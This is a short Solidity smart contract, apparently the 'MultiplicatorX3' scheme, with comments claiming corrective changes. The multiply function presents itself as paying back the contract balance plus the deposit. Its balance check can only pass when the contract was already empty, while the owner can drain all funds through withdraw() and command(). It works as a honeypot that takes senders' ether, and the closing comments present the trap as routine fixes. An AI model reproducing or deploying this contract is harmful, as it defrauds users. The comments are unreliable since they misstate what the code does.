pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }

    function multiply(address adr) public payable {
        require(msg.value >= this.balance);
        adr.transfer(this.balance + msg.value);
    }
}

// Changes Made:
// 1. Changed the variable name from Owner to owner to follow Solidity naming conventions.
// 2. Added a require statement to check the return value of the external call in the command function.
// 3. Added a require statement to ensure that the amount sent in the multiply function is greater than or equal to the current balance of the contract.